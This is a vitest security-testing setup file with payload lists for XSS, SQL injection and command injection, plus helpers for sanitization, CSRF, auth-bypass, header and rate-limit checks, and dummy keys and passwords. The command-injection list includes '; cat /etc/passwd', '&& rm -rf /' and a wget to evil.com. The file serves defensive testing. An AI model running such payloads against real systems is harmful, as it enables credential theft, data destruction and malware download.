/**
 * Security Testing Setup
 * Configuration and utilities for security testing
 */

import { beforeAll, afterAll, beforeEach, afterEach } from 'vitest';

// Security test utilities
global.securityUtils = {
  // XSS attack vectors for testing
  xssPayloads: [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src="x" onerror="alert(\'xss\')">',
    '<svg onload="alert(\'xss\')">',
    '"><script>alert("xss")</script>',
    '\'; alert("xss"); //',
    '<iframe src="javascript:alert(\'xss\')"></iframe>'
  ],

  // SQL injection payloads for testing
  sqlInjectionPayloads: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; DELETE FROM users WHERE '1'='1",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "admin'/*",
    "' OR 1=1#"
  ],

  // Command injection payloads
  commandInjectionPayloads: [
    "; cat /etc/passwd",
    "| ls -la",
    "&& rm -rf /",
    "; wget http://evil.com/malware",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`"
  ],

  // Test input sanitization
  testInputSanitization: (sanitizeFunction, input) => {
    const sanitized = sanitizeFunction(input);
    
    // Should not contain script tags
    expect(sanitized).not.toMatch(/<script.*?>.*?<\/script>/gi);
    
    // Should not contain javascript: protocol
    expect(sanitized).not.toMatch(/javascript:/gi);
    
    // Should not contain event handlers
    expect(sanitized).not.toMatch(/on\w+\s*=/gi);
    
    return sanitized;
  },

  // Test CSRF protection
  testCSRFProtection: (requestFunction, token) => {
    // Test without CSRF token
    const withoutToken = () => requestFunction({});
    
    // Test with invalid CSRF token
    const withInvalidToken = () => requestFunction({ csrfToken: 'invalid' });
    
    // Test with valid CSRF token
    const withValidToken = () => requestFunction({ csrfToken: token });
    
    return {
      withoutToken,
      withInvalidToken,
      withValidToken
    };
  },

  // Test authentication bypass attempts
  testAuthenticationBypass: (protectedFunction) => {
    const bypassAttempts = [
      { authorization: null },
      { authorization: '' },
      { authorization: 'Bearer ' },
      { authorization: 'Bearer invalid' },
      { authorization: 'Basic invalid' },
      { authorization: 'Bearer null' },
      { authorization: 'Bearer undefined' }
    ];

    return bypassAttempts.map(headers => 
      protectedFunction({ headers })
    );
  },

  // Validate secure headers
  validateSecureHeaders: (response) => {
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'strict-transport-security'
    ];

    const missingHeaders = requiredHeaders.filter(
      header => !response.headers || !response.headers[header]
    );

    expect(missingHeaders).toHaveLength(0);
    
    return {
      hasSecureHeaders: missingHeaders.length === 0,
      missingHeaders
    };
  },

  // Test rate limiting
  testRateLimit: async (requestFunction, limit = 100, timeWindow = 60000) => {
    const requests = [];
    const startTime = Date.now();

    for (let i = 0; i < limit + 10; i++) {
      requests.push(requestFunction());
    }

    const results = await Promise.allSettled(requests);
    const endTime = Date.now();

    const successful = results.filter(r => r.status === 'fulfilled').length;
    const rateLimited = results.filter(r => 
      r.status === 'rejected' && 
      r.reason?.status === 429
    ).length;

    return {
      totalRequests: requests.length,
      successful,
      rateLimited,
      duration: endTime - startTime,
      isRateLimitWorking: rateLimited > 0
    };
  }
};

// Mock sensitive data for testing
global.mockSensitiveData = {
  apiKeys: [
    'PKTEST1234567890123456789',
    'sk_test_1234567890123456789012345',
    'polygon_api_key_123456789012345'
  ],
  
  passwords: [
    'password123',
    'admin',
    'test123',
    'P@ssw0rd!',
    'SecureP@ss123'
  ],
  
  emails: [
    'test@example.com',
    'admin@test.com',
    'user@domain.org'
  ],
  
  tokens: [
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test',
    'invalid.jwt.token',
    'expired.jwt.token'
  ]
};

beforeAll(() => {
  console.log('🛡️ Security testing setup initialized');
  
  // Set up security test environment
  process.env.NODE_ENV = 'test';
  process.env.VITE_SECURITY_TESTING = 'true';
});

beforeEach(() => {
  // Clear any cached authentication state
  if (global.localStorage) {
    global.localStorage.clear();
  }
  if (global.sessionStorage) {
    global.sessionStorage.clear();
  }
});

afterEach(() => {
  // Security cleanup after each test
  if (global.console && global.console.warn) {
    // Check for security warnings in console
    const warnings = global.console.warn.mock?.calls || [];
    const securityWarnings = warnings.filter(call => 
      call.some(arg => 
        typeof arg === 'string' && 
        /security|xss|injection|csrf/i.test(arg)
      )
    );
    
    if (securityWarnings.length > 0) {
      console.log('⚠️ Security warnings detected:', securityWarnings);
    }
  }
});

afterAll(() => {
  console.log('🔒 Security testing cleanup completed');
});